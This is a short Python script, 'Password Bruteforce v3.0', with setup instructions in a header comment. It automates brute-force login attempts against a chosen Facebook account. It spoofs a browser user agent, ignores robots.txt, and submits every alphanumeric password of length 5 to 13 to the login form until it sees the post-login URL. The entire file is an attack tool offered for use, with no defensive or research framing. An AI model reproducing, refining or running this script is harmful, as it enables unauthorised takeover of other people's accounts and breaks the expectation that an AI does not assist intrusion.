''' 			Password Bruteforce v3.0
1. Install python 3 on your computer or VPS, be carefull ;)
2. Install the imported modules - mechanize, itertools pip install...
3. Edit the file variables - username and the lenght range of the password
4. Run the script - python password_bruteforce_v3.0.py
Made by: weasley#9884'''

# import modules
import os
import sys
import time
import base64
import string
import itertools
import mechanize

timeout00 = 00
username = '@user' # <<-- Change the username
url = 'https://www.facebook.com/'
passw00 = 'ZZZZZZZ999999'
run00 = True

# don't touche! :P
br00 = mechanize.Browser()
br00.addheaders= [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36')]
br00.set_handle_equiv( True )
br00.set_handle_gzip( True )
br00.set_handle_redirect( True ) 
br00.set_handle_referer( True )
br00.set_handle_robots( False )	

# inject data into api
def inject_byte01(valid):
	try:
		chars = string.ascii_lowercase + string.ascii_uppercase + string.digits # + string.punctuation
		for passw_length in range(5, 14): # <<-- Password lenght range
			for guess00 in itertools.product(chars, repeat=passw_length):
				time.sleep(timeout00)				
				guess00 = ''.join(guess00)
				br00.open('https://www.facebook.com/login.php')
				br00.select_form(nr= 0)
				br00.form['email'] = username
				br00.form['pass'] = guess00
				sub00 = br00.submit()
				print('{}, {}, {}'.format(guess00, sub00, sub00.geturl()))
				if sub00.geturl() == 'https://www.facebook.com/?sk=welcome' or guess00 == valid:
					print('~{}'.format(guess00))
					return
	except ValueError:
		return				

#kur
inject_byte01(passw00)

sys.exit()
